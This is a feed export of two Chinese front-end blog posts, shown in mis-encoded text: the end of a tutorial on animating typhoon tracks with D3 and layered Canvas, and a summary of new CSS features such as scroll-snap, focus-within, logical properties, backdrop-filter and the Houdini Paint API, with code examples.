æ²’æœ‰äººèªªé Canvas åªèƒ½æœ‰ä¸€å±¤ï¼Œä½ å¯ä»¥ç–ŠåŠ ä¸€å±¤ Canvas ä¸Šå»ï¼Œè®“è·Ÿè‘—ç·šæ®µç§»å‹•çš„æš´é¢¨åœˆç¨è‡ªä¸€å€‹åœ–å±¤ï¼Œé€™æ¨£ä¸€ä¾†å°±ä¸æœƒäº’ç›¸å½±éŸ¿äº†ï¼
moveDash-multilayermoveDash = (canvasCtx, canvasTyphoonMarkerCtx, typhoonId, typhoonPath, length, marker, frac, dir = -1) =&gt; &#123;  // default direction right-&gt;left  canvasCtx.setLineDash([length]);  canvasCtx.lineDashOffset = dir * (frac + length);  canvasCtx.globalCompositeOperation = &#x27;destination-over&#x27;;  canvasCtx.stroke();  const p = this.invisibleSVGPath[typhoonId].getPointAtLength(frac);  canvasCtx.save();  // Move typhoon marker  canvasTyphoonMarkerCtx.clearRect(0, 0, 1000, 600);  canvasTyphoonMarkerCtx.beginPath();  canvasTyphoonMarkerCtx.setLineDash([0]);  canvasTyphoonMarkerCtx.lineDashOffset = 0;  canvasTyphoonMarkerCtx.lineWidth = 1;  canvasTyphoonMarkerCtx.strokeStyle = &#x27;rgba(53, 247, 14,0.8)&#x27;;  canvasTyphoonMarkerCtx.arc(p.x, p.y, 10, 0, Math.PI * 2, true);  canvasTyphoonMarkerCtx.closePath();  canvasTyphoonMarkerCtx.stroke();&#125;

const p = this.invisibleSVGPath[typhoonId].getPointAtLength(frac); é€™é‚Šæˆ‘å€‘å…ˆå‰å‰µç«‹çš„ invisibleSVGPath åˆç™»å ´äº†ï¼Œç”¨ä¾†å–å¾—ç›®å‰çš„ç·šæ®µé»è³‡æ–™ã€‚
Demo: åˆ©ç”¨å…©å±¤ Canvas ä¾†å¯¦ä½œè·Ÿè‘—ç·šæ®µç§»å‹•çš„æš´é¢¨åœˆï¼š


æœ€å¾Œ Demo - åŠ ä¸Šæ™‚é–“åˆ¤æ–·ã€é¡è‰²å€åˆ¥ã€å¤šå€‹é¢±é¢¨çš„æƒ…æ³ï¼š

é€™é‚Šé‚„è¦æ³¨æ„ä¸€ä¸‹ï¼Œç¨æ—©æåˆ°çš„ globalCompositeOperationï¼Œå¦‚æœä½ è¨­ç‚º source-overï¼Œä¹Ÿå°±æ˜¯æ–°ç¹ªè£½å‡ºçš„ç‰©ä»¶è“‹åœ¨èˆŠçš„ä¸Šé¢çš„è©±ï¼Œä½ å°±æœƒç™¼ç¾é¢±é¢¨åœˆéƒ½è¢«å£“åœ¨ç·šæ®µä¸‹äº†ï¼

å› ç‚ºåœ¨ moveDash ä¸­ï¼Œç·šæ®µæ˜¯ä¸€ç›´åœ¨é‡æ–°ç¹ªè£½çš„ï¼Œè€Œä½ ç•™ä¸‹çš„é¢±é¢¨åœˆç›¸å°å°±æ˜¯èˆŠçš„ç‰©ä»¶ï¼Œæ‰€ä»¥è¨˜å¾—è¦æ”¹æˆ destinatioin-over æ‰èƒ½æœ‰æ¯”è¼ƒå¥½çš„æ•ˆæœï¼
æ ¹æ“šæ™‚é–“ç•™ä¸‹æš´é¢¨åœˆé€™å¯¦ä½œæ–¹æ³•å¾ˆç°¡å–®ï¼Œå°±æ˜¯åœ¨ moveDash ä¸­åˆ¤æ–·è©²é»çš„æ™‚é–“ï¼Œè‹¥ç¬¦åˆè¦æ±‚å°±ç¹ªè£½ä¸Šä¸€å€‹åœ–æ¡ˆå³å¯ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥ç›´æ¥å¾ code ä¸­çœ‹åˆ°ã€‚
å¦‚ä½•è®“æ‰€æœ‰å‹•ç•«éƒ½çµæŸå¾Œæ‰ä¸€èµ·é‡æ’­ï¼Ÿåœ¨æˆ‘æœ€å¾Œä¸€å€‹ Demo ä¸­ï¼Œä¸€å€‹é¢±é¢¨çš„è·¯å¾‘è¼ƒçŸ­ï¼Œä¸€å€‹è¼ƒé•·ï¼Œä½†å»èƒ½åŒæ™‚é‡æ’­ï¼Œæˆ‘æ¡ç”¨çš„æ–¹æ³•å…¶å¯¦è »æ„šè ¢çš„ï¼Œæš«æ™‚é‚„æ²’æƒ³åˆ°æ›´å¥½çš„è§£æ³•ï¼Œæ­¡è¿å¤§å®¶æä¾›ã€‚
æˆ‘çš„æ–¹æ³•æ˜¯ï¼Œç”¨ä¸€å€‹å…±æœ‰è®Šæ•¸ this.allDone ä¾†è¨˜éŒ„æ¯æ¢è·¯å¾‘æ˜¯å¦å·²ç¶“æ’­å®Œå‹•ç•«ï¼ˆèµ°å®Œæ•´æ¢ pathï¼‰ï¼Œæ¥è‘—åœ¨ updateLine() ä¸­ï¼Œç•¶è‡ªå·±è·‘å®Œ path æ™‚ï¼Œå°±æœƒå¤šæª¢æŸ¥ä¸€ä¸‹ this.allDone ä¸­çš„çµæœï¼Œå¦‚æœé‚„æœ‰äººåœ¨è·‘ï¼Œé‚£è‡ªå·±å°±ç¹¼çºŒå‘¼å« requestAnimationFrameï¼Œä½†ä¸å°‡ Canvas æ¸…ç©ºï¼Œæ‰€ä»¥æœƒä¸€ç›´ loop æª¢æŸ¥ this.allDoneï¼Œç›´åˆ°å¤§å®¶éƒ½è·‘å®Œæ‰æ¸…ç©º Canvas ä¸¦é‡æ–° loopã€‚
updateLine-multipleif (this.progress[typhoonId] &lt; length) &#123;   // æ­£å¸¸åŸ·è¡Œ defineLine èˆ‡ moveDash&#125; else &#123;  // ä¸æ–·æª¢æŸ¥æ˜¯å¦æ¯æ¢ path éƒ½è·‘å®Œäº†  this.allDone[typhoonId] = true;  let keepWaiting;  Object.keys(this.allDone).forEach((allDoneTyphoonId) =&gt; &#123;    if (!this.allDone[allDoneTyphoonId]) &#123;        keepWaiting = true;    &#125;    return keepWaiting;  &#125;);  if (keepWaiting) &#123;    requestAnimationFrame(this.updateLine.bind(this, canvasCtx, canvasTyphoonMarkerCtx, typhoonPath, 500, marker, typhoonId));  &#125; else &#123;    // æ¸…ç©º canvas ä¸¦é‡æ–° loop  &#125;&#125;

çµè«–åˆ©ç”¨ Canvas ç¹ªè£½å‹•ç•«å¯¦éš›ä¸Šæ¯”ç”¨ D3 + svg ç…©ç‘£å¤šäº†ï¼Œä½†æ˜¯ç•¶ä½ çš„å‹•ç•«æœ‰å¤§é‡çš„ç‰©ä»¶æ™‚ï¼ŒCanvas èƒ½ç‚ºä½ å¸¶ä¾†å¤§å¹…çš„ performance æ”¹é€²ï¼Œç•¢ç«Ÿ svg çš„æ“ä½œæœƒç›´æ¥å½±éŸ¿åˆ° DOM treeã€‚å¦å¤–ï¼Œå¯¦éš›ä¸Šè¦å°‡é€™äº›æ±è¥¿æ‡‰ç”¨åˆ° Production çš„è©±ï¼Œå…¶å¯¦é‚„æœ‰éå¸¸å¤šç´°ç¯€è¦èª¿æ•´ï¼ŒåŒ…å«å„ç¨® Browser èˆ‡ Device çš„å‘ˆç¾ã€Map Scale çš„å½ˆæ€§ç­‰ç­‰ï¼Œé‚„æœ‰å¾ˆé•·çš„è·¯è¦èµ°å•Šâ€¦é€™ç¯‡æ–‡ç« ç®—æ˜¯æˆ‘çš„ä¸€å€‹ç­†è¨˜ï¼Œå¯«å¾—æœ‰é»é›œäº‚ï¼Œæ­¡è¿ï¼ˆæœ‰çœ‹å®Œçš„æˆ–æ˜¯çœ‹ä¸ä¸‹å»çš„ï¼‰è®€è€…çµ¦äºˆä»»ä½•å»ºè­°ï¼(PS. æˆ‘æœ¬ä¾†è·¯å¾‘è·Ÿæš´é¢¨åœˆçš„é¡è‰²æ˜¯æƒ³å¼„å¾—åƒ EVA é¢¨æ ¼ï¼Œçµæœæœ‰é»æ…˜XD  ä½†æˆ‘æ‡¶å¾—ä¿®äº†å°±çµ¦å¤§å®¶ç¬‘ç¬‘ï½)
è³‡æ–™ä¾†æº
How SVG Line Animation Works
D3.js å¯¦æˆ° ï¼ Canvas æŠŠæˆ‘çš„è¦–è¦ºåŒ–è®Šã€Œå¿«ã€äº†ï¼
MDN Canvas tutorial
MDN globalCompositeOperation
mbostock d3.geoPath + Canvas

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>canvas</tag>
        <tag>map</tag>
        <tag>animation</tag>
        <tag>d3.js</tag>
      </tags>
  </entry>
  <entry>
    <title>CDS2019 Next-generation web styling æ•´ç†ä»‹ç´¹</title>
    <url>/2019/12/30/cds2019-next-generation-web-styling-%E6%95%B4%E7%90%86%E4%BB%8B%E7%B4%B9/</url>
    <content><![CDATA[å‰è¨€ä¸€é™£å­æ²’æœ‰é—œæ³¨ CSS çš„æœ€æ–°ç™¼å±•ï¼Œæœ€è¿‘è¶è‘—å¹´å‡è£œå¸¶ 2019 Google Chrome Summit æ™‚ï¼Œçœ‹åˆ°é€™å ´ talk - Next-generation web stylingï¼Œè£¡é¢æåˆ°ä¸å°‘æœ‰è¶£çš„æ–°å±¬æ€§ï¼Œé€éé€™ç¯‡æ–‡ç« æ•´ç†ä¸€ä¸‹å…§å®¹ï¼Œåˆ†äº«çµ¦å„ä½èˆ‡æœªä¾†çš„æˆ‘ã€‚è¨»ï¼šå®˜æ–¹åœ¨ 12 æœˆåˆä¹Ÿç™¼ä½ˆäº†æ–‡å­—ç‰ˆæœ¬ï¼Œç¿’æ…£é–±è®€åŸæ–‡çš„è®€è€…å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚
æ–°ä¸–ä»£çš„â€¦CSS
scroll-snap - native scroll inertia and decelerations
focus-within - solving focus accessibility within elements
@media (prefers-*) - considerately adjust your UI&#x2F;UX to a userâ€™s device preferences via Media Query hooks provided by browser
logical properties - dynamic directionality
sticky situations - keeping UI within the viewport
backdrop-filter - style adjustments behind an element
:is() - formerly :any() &amp;&amp; :matches()
Grid-gap
CSS Houdini - a low-level API for CSS
typed OM - CSS values as JavaScript objects rather than strings
Paint API - create your own paint functions using a canvas-like syntax
animation worklet - off the main thread animation
Others - size, aspect-ratio, min(), max(), clamp(), list style type, display: outer inner, CSS regions, CSS modules

æ¼”è¬›ä¸­æ´‹æ´‹ç‘ç‘ä»‹ç´¹äº† 12 ç¨®ä»¥ä¸Šçš„ CSS æ–°å±¬æ€§èˆ‡æ–°åŠŸèƒ½ï¼Œé›–ç„¶å…¶ä¸­æœ‰å¹¾ä½è€æœ‹å‹åœ¨æˆ‘ä¹‹å‰çš„æ–‡ç«  - CSS é­”è¡“å¸« Houdini API ä»‹ç´¹ æœ‰èªªæ˜éï¼Œä½†å¤§éƒ¨åˆ†çš„æ–°å±¬æ€§é‚„æ˜¯ä»¤äººæ„Ÿåˆ°æŒ¯å¥®ï¼
scroll-snapçœ‹åˆ° snap è‡ªç„¶åæ‡‰å…ˆæƒ³åˆ°è–©è«¾æ–¯å½ˆæŒ‡æ¶ˆæ»…ä¸€åŠäººå£ï¼Œä½†å…¶å¯¦å­—é¢ä¸Šé‚„æœ‰è¿…é€Ÿå›å¾©çš„æ„æ€ï¼Œè€Œ scroll-snapï¼Œé¡§åæ€ç¾©å°±æ˜¯è¦è®“ä½ åœ¨ scroll æ™‚ï¼Œèƒ½å¤ è¿…é€Ÿå›åˆ°è¨­å®šçš„ snap pointã€‚é€™éº¼èªªæœ‰é»æŠ½è±¡ï¼Œå›æƒ³ä¸€ä¸‹ä½ ä½¿ç”¨éçš„ Carousel å¥—ä»¶ï¼Œå¤§å¤šæ•¸ç•¶ä½ æ»‘å‹•åœ–ç‰‡è¶…éä¸€åŠè·é›¢æ™‚ï¼Œå¥—ä»¶æœƒè‡ªå‹•å¹«ä½ å°‡ä¸‹ä¸€å¼µåœ–ç‰‡æ‹‰åˆ°æ­£ä¸­é–“ï¼Œè‹¥æ˜¯æ»‘å‹•å°æ–¼ä¸€åŠè·é›¢ï¼Œå‰‡æœƒå½ˆå›è‡³åŸæœ¬çš„åœ–ç‰‡ï¼Œå°±åƒé€™æ¨£ï¼š

scroll-snap ä¸»è¦æä¾›çš„å…©å€‹å±¬æ€§ï¼šscroll-snap-type èˆ‡ scroll-snap-align å°±å¯ä»¥è®“ä½ ç›´æ¥é€é CSS é”åˆ°ä¸€æ¨£æ•ˆæœï¼Œè€Œä¸”æ“æœ‰è¶³å¤ çš„èª¿æ•´å½ˆæ€§ã€‚
Demoï¼š

  See the Pen 
  scroll-snap example by Arvin (@arvin0731)
  on CodePen.



scroll-snap-type ä½œç”¨åœ¨ scroll container ä¸Šé ­ï¼Œç”¨ä¾†è¡¨æ˜è¦ç”¨å“ªç¨® type çš„ scroll èˆ‡ scroll çš„æ–¹å‘ã€‚ï¼ˆè¨»ï¼šscroll container ã€€æŒ‡çš„æ˜¯æ“æœ‰ overflow: scroll|auto å±¬æ€§ï¼Œä¸”å…¶å…§å…ƒç´ è¶³ä»¥é€ æˆ overflow çš„ containerã€‚ï¼‰
è€Œæ¯”èµ·ä¸Šè¿°ä¸€èˆ¬ carousel å¥—ä»¶é è¨­çš„è¡Œç‚ºï¼ˆç§»å‹•å°æ–¼ä¸€åŠè·é›¢æ‹‰å›å‰ä¸€å¼µåœ–ï¼‰ï¼Œé€éçµ¦äºˆ scroll-snap-align ä¸åŒçš„å±¬æ€§ï¼šstartã€end å’Œ centerï¼Œå¯ä»¥è‡ªè¡Œæ±ºå®š snap pointï¼Œå‘ŠçŸ¥å…§å®¹æ‡‰è©²è¦å°é½Šåˆ° scroll container ä¸­çš„å“ªå€‹é»ã€‚
ä½ å¯ä»¥å¾ä¸Šé¢çš„ Codepen demo link å»ä¿®æ”¹ scroll-snap-align çœ‹çœ‹ï¼Œæœ‰ä»€éº¼ä¸åŒçµæœã€‚
å¦å¤–ï¼Œå¦‚æœä½ ä¸æƒ³è®“æ¯æ¬¡ snap éƒ½å°é½Šé‚Šç·£ï¼Œèƒ½ç¨å¾®éœ²å‡ºå‰ä¸€å¼µåœ–çš„å…§å®¹ï¼Œå¯ä»¥é€é scroll-padding èˆ‡ scroll-margin çš„èª¿æ•´ä¾†é”æˆã€‚ä¸éæ³¨æ„ï¼Œå…©è€…çš„æ‡‰ç”¨å°è±¡æœ‰æ‰€ä¸åŒã€‚
scroll-padding éœ€è¦æ‡‰ç”¨åœ¨ scroll container ä¸Šï¼š
.scroller &#123;  height: 300px;  overflow-y: scroll;  scroll-snap-type: y mandatory;  scroll-padding: 40px;&#125;.scroller section &#123;  scroll-snap-align: start;&#125;

è€Œ scroll-margin å‰‡æ˜¯é‹ç”¨åœ¨ container å…§çš„ children ä¸Šé ­ï¼š
.scroller &#123;  height: 300px;  overflow-y: scroll;  scroll-snap-type: y mandatory;&#125;.scroller section &#123;  scroll-snap-align: start;  scroll-margin: 40px;&#125;

å…©è€…æ•ˆæœç›¸åŒï¼š

  See the Pen 
  scroll-snap example-2 by Arvin (@arvin0731)
  on CodePen.



é€™å°æ–¼ä½ çš„ scroll container ä¸­æœ‰ fixed çš„å…ƒç´ æ™‚å¾ˆæœ‰å¹«åŠ©ï¼š

  See the Pen 
  scroll-snap example-fixedHeader by Arvin (@arvin0731)
  on CodePen.



æ›´å¤šç´°ç¯€ï¼ŒMDN ä¸Šæœ‰è »å®Œæ•´çš„èªªæ˜ã€‚

focus-withinåœ¨Web Accessibility çš„é‡è¦æ€§é€™ç¯‡æ–‡ç« ä¸­ï¼Œæœ‰æåˆ°éå…ƒç´ å¯èšç„¦æ€§çš„é‡è¦ï¼Œè®“ä½¿ç”¨è€…èƒ½ç”¨ tab åœ¨ç¶²é å„å…ƒç´ é–“åˆ‡æ›ã€‚ä½†å¯¦ä½œä¸Šå¸¸å¸¸é‡åˆ°ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯ç•¶æˆ‘å€‘åˆ©ç”¨ :focus åƒé¡åˆ¥è£½ä½œ Menu çš„ä¸‹æ‹‰é¸å–®ï¼Œè®“å­å…ƒç´ åœ¨çˆ¶å…ƒç´ è¢« focus å¾Œé¡¯ç¤ºå‡ºä¾†æ™‚ï¼Œtab åˆ‡æ›æœƒå¤±æ•—ï¼Œå› ç‚ºç•¶ä½  tab focus åˆ°å­å…ƒç´ æ™‚ï¼Œçˆ¶å…ƒç´ å°±å¤±å» focus ç‹€æ…‹ï¼Œå­å…ƒç´ ä¹Ÿå› æ‡‰æ¶ˆå¤±ï¼š
google çš„åœ–ç•«èªªæ˜å¾ˆæ¸…æ¥šï¼š


ä½†è‹¥æ˜¯æ›æˆ focus-withinï¼Œå°±ä¸å†æœ‰é€™å•é¡Œäº†ï¼Œä»–æœƒåœ¨çˆ¶å…ƒç´ è¢« focus æ™‚è§¸ç™¼ï¼š
.menu:focus-within &#123;  display: block;  opacity: 1;  visibility: visible;&#125;


  See the Pen 
  focus-within-example by Arvin (@arvin0731)
  on CodePen.




@media (prefers-*)Media Queries è®“æˆ‘å€‘å®¹æ˜“å¯¦ä½œ RWD è¨­è¨ˆï¼Œè€Œç¾åœ¨æœ€æ–°çš„ Media Queries å¯ä»¥è®“æˆ‘å€‘åµæ¸¬åˆ°ä½¿ç”¨è€… OS-level çš„ç³»çµ±åå¥½è¨­å®šï¼Œä¾‹å¦‚ dark-modeï¼Œæˆ–æ˜¯ä½éšè¨­å‚™å¯ä»¥é–‹å•Ÿ prefers-reduced-motion ä¾†é™ä½å‹•ç•«ç¯€çœè³‡æºã€‚
é€™äº›èƒ½å¤ è‡ªå‹•åµæ¸¬ç³»çµ±åå¥½ï¼Œä¸¦çµ¦äºˆå›æ‡‰çš„ Media Queries æœ‰ï¼š
prefers-reduced-motionprefers-color-schemeprefers-contrastprefers-reduced-transparencyforced-colorsinverted-colorslight-level
ç›®å‰æœ€æ–°ç‰ˆçš„ Chrome (ver. 79) å·²ç¶“æœ‰æä¾› prefers-reduced-motion èˆ‡ prefers-color-scheme çš„ emulationï¼Œåªè¦æ‰“é–‹ Devtoolï¼Œåˆ° Rendering tab ä¸‹å°±èƒ½çœ‹åˆ°ï¼š

åœ¨æ¼”è¬›ä¸­ï¼Œè¬›è€… Adam ç‰¹åˆ¥å¼·èª¿ï¼Œreduced-motion ä¸æ˜¯ no-motionï¼Œä½¿ç”¨è€…æƒ³è¦å°‘ä¸€é»å‹•ç•«ï¼Œè€Œéå®Œå…¨æ²’æœ‰å‹•ç•«ï¼Œå¯ä»¥å¾ æ¼”è¬›ä¸­çš„ç¯„ä¾‹æ„Ÿå—ä¸€ä¸‹ï¼ˆrefã€codepen demoï¼‰ï¼š

logical propertiesèº«ç‚ºå‰ç«¯å·¥ç¨‹å¸«ï¼Œæˆ–å¤šæˆ–å°‘éƒ½æœƒè™•ç† i18n çš„å•é¡Œï¼Œåœ¨ç¶²é æ’ç‰ˆä¸Šï¼Œä¸åŒèªè¨€é–“çš„ writing system å¯èƒ½æœƒé€ æˆæˆ‘å€‘éœ€è¦å€‹åˆ¥ç‚ºä¸åŒçš„èªè¨€å®¢è£½åŒ–è¨­å®š css styleï¼Œä¾†èª¿æ•´ marginã€padding ç­‰ç­‰ï¼Œè€Œ Logical properties å°±æ˜¯å¸Œæœ›èƒ½ç”¨æ›´æœ‰æ•ˆç‡ã€æ›´å¥½ç¶­è­·çš„æ–¹å¼ä¾†è§£æ±ºé€™å•é¡Œã€‚ image ref
é€™æ˜¯æˆ‘å€‘ç†ŸçŸ¥çš„ box modelï¼š


Logical properties å°‡å…¶æ”¹ç‚ºï¼š


å·®åˆ¥åœ¨æ–¼å¾åŸæœ¬å–®ç´” topã€downã€leftã€right å¤–ï¼Œå¤šäº† block-* èˆ‡ inline-* å…©å€‹ç¶­åº¦ï¼Œæ ¹æ“šä½¿ç”¨èªè¨€çš„ä¸åŒï¼Œç€è¦½å™¨æœƒè‡ªå‹•èª¿æ•´ block-* èˆ‡ inline-* ä»£è¡¨çš„å±¬æ€§ï¼Œä¾‹å¦‚åœ¨è‹±æ–‡çš„å¯«ä½œç³»çµ±ä¸Šï¼Œblock-start å°±ä»£è¡¨ topï¼Œinline-end ä»£è¡¨ rightã€‚
æœ‰äº† logical properties çš„å¹«åŠ©ï¼Œå°±èƒ½ç°¡å–®çš„ä¾æ“šèªè¨€ç³»çµ±è®Šæ›´ writing-mode èˆ‡ direction ä¾†èª¿æ•´ layout refï¼š

sticky situationsPosition: sticky æ‡‰è©²å·²ç¶“å¾ˆå¤šäººç”¨åœ¨ç”¢å“ç•¶ä¸­äº†å§ï¼Œä½†é€™æ¬¡ Google é‚„æ˜¯æŠŠå®ƒæ‹¿å‡ºä¾†ç‰¹åˆ¥å†ä»‹ç´¹ä¸€ç•ªï¼Œæä¾›äº†ä¸‰ç¨®æ‡‰ç”¨ sticky çš„æ–¹å¼ï¼Œè »å€¼å¾—åƒè€ƒçš„ï¼š

ä»”ç´°çœ‹æ¯ç¨®æ‡‰ç”¨çš„å·®åˆ¥ï¼ŒåŸºæœ¬ä¸Šåœ¨æ–¼ sticky çš„å…ƒç´ å¦‚ä½•è¢«â€è§£é™¤â€œ stickyï¼Œæ¯”è¼ƒæœ‰è¶£çš„æ˜¯ Sticky Desperadoï¼Œåˆ©ç”¨ grid-system é”åˆ° two column çš„è®ŠåŒ–ï¼Œå¯ä»¥åˆ° codepen ä¸Šè§€çœ‹å¯¦éš›ç¨‹å¼ç¢¼ï¼šSticky Slideã€Sticky Stackã€Sticky Desperado

backdrop-filterå†ä¾†æ˜¯æˆ‘æœ€å–œæ­¡çš„ä¸€å€‹æ–°å±¬æ€§ã€‚ä»¥å¾€æˆ‘å€‘è¦é”åˆ°æ¨¡ç³Šåœ–ç‰‡èƒŒæ™¯ï¼Œä¸¦åœ¨ä¸Šé¢åŠ ä¸Šæ–‡å­—çš„æ•ˆæœï¼Œå¯èƒ½éœ€è¦é€™æ¨£åšï¼š

  See the Pen 
  blur image with text by Arvin (@arvin0731)
  on CodePen.



éœ€è¦æŠŠåœ–ç‰‡è¨­å®šæˆ background-imageï¼Œè¨­å®š filter: blurï¼Œå†é€é position:fixed æŠŠæ–‡å­—é‡˜ä¸Šå»ã€‚ä½†æœ‰äº† backdrop-filterï¼Œæˆ‘å€‘ç°¡å–®å°‡é€™å€‹å±¬æ€§å¥—ç”¨åœ¨æƒ³è¦ç–ŠåŠ çš„æ–‡å­—ä¸Šï¼Œä¸¦ç›´æ¥æ”¾ç½®æ–¼ img å…ƒç´ ï¼š

  See the Pen 
  blur image with text-backdrop-filter by Arvin (@arvin0731)
  on CodePen.



:is():is() é€™å€‹åƒé¡åˆ¥å·²ç¶“å­˜åœ¨å¾ˆä¹…äº†ï¼Œä½†ä»–å€‘è¦ºå¾—å¾ˆå°‘äººçœŸæ­£ä½¿ç”¨å®ƒï¼Œå› æ­¤ç‰¹åˆ¥æå‡ºä¾†ä»‹ç´¹ã€‚åŸºæœ¬ä¸Š :is() çš„åŠŸç”¨å°±æ˜¯èƒ½è®“ä½ å°‡ç”¨é€—è™Ÿåˆ†éš”çš„ selectorï¼Œä»¥åƒæ•¸å½¢å¼æ”¾å…¥å…¶ä¸­ï¼Œä¾†é”æˆåŒæ¨£æ•ˆæœï¼š
button.focus,button:focus &#123;  â€¦&#125;article &gt; h1,article &gt; h2,article &gt; h3,&#123;  â€¦&#125;/* èˆ‡ä¸Šé¢åŒæ¨£æ•ˆæœ */button:is(.focus, :focus) &#123;  â€¦&#125;article &gt; :is(h1,h2,h3) &#123;  â€¦&#125;

gapé€™é‚ŠæŒ‡çš„ gapï¼Œå°±æ˜¯ CSS Grid Layout ä¸­çš„ gapï¼Œè®“ä½ ä¸ç”¨ç‚ºäº†è£½é€ å‡ºå…ƒç´ é–“çš„éš”é–“ï¼Œä½¿ç”¨ marginï¼Œå»å¤šå‡ºä¸å¿…è¦çš„ç©ºéš™ img refï¼š


åœ¨æ¼”è¬›ä¸­ä»–å€‘ä¹Ÿæœ‰æåˆ°ï¼Œgap é™¤äº†èƒ½ç”¨åœ¨ Grid layout å¤–ï¼ŒFireFox ä¹Ÿæ”¯æ´å°‡å…¶æ‡‰ç”¨åœ¨ flex display ä¸Šé ­ï¼Œæ…£ç”¨ FireFox ç€è¦½å™¨çš„è®€è€…å¯ä»¥å˜—è©¦çœ‹çœ‹ã€‚
CSS Houdiniã€typed OMã€Paint APIã€WorkletCSS Houdini æ˜¯ç”±ä¸€ç¾¤ä¾†è‡ª Mozilla, Apple, Opera, Microsoft, HP, Intel, IBM, Adobe èˆ‡ Google çš„å·¥ç¨‹å¸«æ‰€çµ„æˆçš„å·¥ä½œå°çµ„ï¼Œå¿—åœ¨å»ºç«‹ä¸€ç³»åˆ—çš„ APIï¼Œè®“é–‹ç™¼è€…èƒ½å¤ ä»‹å…¥ç€è¦½å™¨çš„ CSS engine é‹ä½œï¼Œå¸¶çµ¦é–‹ç™¼è€…æ›´å¤šçš„è§£æ±ºæ–¹æ¡ˆï¼Œç”¨ä¾†è§£æ±º CSS é•·ä¹…ä»¥ä¾†çš„å•é¡Œï¼š

Cross-Browser isse
CSS Polyfill çš„è£½ä½œå›°é›£

CSS Houdini æä¾›çš„ API è®“ä½ èƒ½å­˜å– CSS Object Modelï¼Œè®“ä½ é€é Javascript å»¶å±• CSS çš„åŠŸèƒ½ï¼Œæ¯”èµ· CSS polyfill èƒ½æœ‰æ›´å¥½çš„æ•ˆèƒ½ã€‚
è€Œ Workletã€Typed OMã€Paint API ä¹Ÿéƒ½åŒ…å«åœ¨ CSS Houdini çš„è¦ç¯„ä¸­ï¼Œåœ¨æˆ‘ä¹‹å‰çš„æ–‡ç«  CSS é­”è¡“å¸« Houdini API ä»‹ç´¹ éƒ½æœ‰è©³ç´°ä»‹ç´¹éï¼Œæœ‰èˆˆè¶£å¯ä»¥å‰å¾€ç´°è®€ã€‚
é€™é‚Šæˆ‘ç°¡å–®èªªæ˜ typed OM èˆ‡ Paint API é€™å…©å€‹ç›®å‰å¯¦ä½œåº¦è¼ƒé«˜çš„æ–°åŠŸèƒ½ï¼Œå…¶ä¸­ Paint API éœ€è¦ Worklet çš„è¼”åŠ©ã€‚
typed OM ç°¡å–®ä¾†èªªå°±æ˜¯å°±æ˜¯ CSSOM çš„å¼·åŒ–ç‰ˆï¼Œæœ€ä¸»è¦çš„åŠŸèƒ½åœ¨æ–¼å°‡ CSSOM æ‰€ä½¿ç”¨çš„å­—ä¸²å€¼è½‰æ›æˆå…·æœ‰å‹åˆ¥æ„ç¾©çš„ JavaScript è¡¨ç¤ºå½¢æ…‹ï¼Œä¾‹å¦‚ä½ å¯ä»¥é€™æ¨£æ“ä½œ CSS style: (source from CSS Houdini- the bridge between CSS, JavaScript and the browser)
// CSS -&gt; JSconst map = document.querySelector(&quot;.example&quot;).styleMap;console.log(map.get(&quot;font-size&quot;));// CSSSimpleLength &#123;value: 12, type: &quot;px&quot;, cssText: &quot;12px&quot;&#125;// JS -&gt; JSconsole.log(new CSSUnitValue(5, &quot;px&quot;));// CSSUnitValue&#123;value:5,unit:&quot;px&quot;,type:&quot;length&quot;,cssText:&quot;5px&quot;&#125;// JS -&gt; CSS// set style &quot;transform: translate3d(0px, -72.0588%, 0px);&quot;elem.outputStyleMap.set(  &quot;transform&quot;,  new CSSTransformValue([    new CSSTranslation(0, new CSSSimpleLength(100 - currentPercent, &quot;%&quot;), 0),  ]));

ç”¨ styleMap å–å¾—å…ƒç´ ä¸Šä»¥ç‰©ä»¶å‹æ…‹è¡¨ç¤ºçš„ style å±¬æ€§ï¼Œä¸¦èƒ½é€é outputStyleMap ä¾†è¨­å®š styleï¼Œå…¶ä¸­é‚„å¯çœ‹å‡ºå¤šäº† CSSTransformValue èˆ‡ CSSTranslation é€™ç¨® Class Interfaceã€‚
è€Œ Paint API å‰‡æä¾›ä¸€å€‹å«åš registerPaint çš„æ–¹æ³•ï¼šï¼š
registerPaint(  &quot;simpleRect&quot;,  class &#123;    static get inputProperties() &#123;      return [&quot;--rect-color&quot;];    &#125;    paint(ctx, size, properties) &#123;      // ä¾æ“š properties æ”¹è®Šé¡è‰²      const color = properties.get(&quot;--rect-color&quot;);      ctx.fillStyle = color.cssText;      ctx.fillRect(0, 0, size.width, size.height);    &#125;  &#125;);

å®£å‘Šä½¿ç”¨ï¼š
.div-1 &#123;  --rect-color: red;  width: 50px;  height: 50px;  background-image: paint(simpleRect);&#125;.div-2 &#123;  --rect-color: yellow;  width: 100px;  height: 100px;  background-size: 50% 50%;  background-image: paint(simpleRect);&#125;

.div-1 èˆ‡ .div-2 å°±å¯ä»¥æ“æœ‰å„è‡ªå®šç¾©å¯¬é«˜é¡è‰²çš„æ–¹å½¢ background-imageã€‚
ä¸éé€™é‚Šè¦æ³¨æ„ä¸€ä¸‹ï¼Œä¸Šé¢æ’°å¯«çš„ js æª”æ¡ˆï¼Œä½ å¯èƒ½æœƒè¦ºå¾—å°±ç›´æ¥åƒä¸€èˆ¬ web åµŒå…¥ js çš„æ–¹å¼ä¸€æ¨£å³å¯ï¼Œä½†å¯¦éš›ä¸Šä¸¦éå¦‚æ­¤ï¼Œæˆ‘å€‘éœ€è¦é€é Worklets ä¾†å¹«æˆ‘å€‘è¼‰å…¥ã€‚ä»¥ä¸Šé¢çš„ Paint API ç‚ºä¾‹ï¼š
// add a WorkletpaintWorklet.addModule(&quot;simpleRect.js&quot;);// WORKLET &quot;simpleRect.js&quot;registerPaint(  &quot;simpleRect&quot;,  class &#123;    static get inputProperties() &#123;      return [&quot;--rect-color&quot;];    &#125;    paint(ctx, size, properties) &#123;      // ä¾æ“š properties æ”¹è®Šé¡è‰²      const color = properties.get(&quot;--rect-color&quot;);      ctx.fillStyle = color.cssText;      ctx.fillRect(0, 0, size.width, size.height);    &#125;  &#125;);

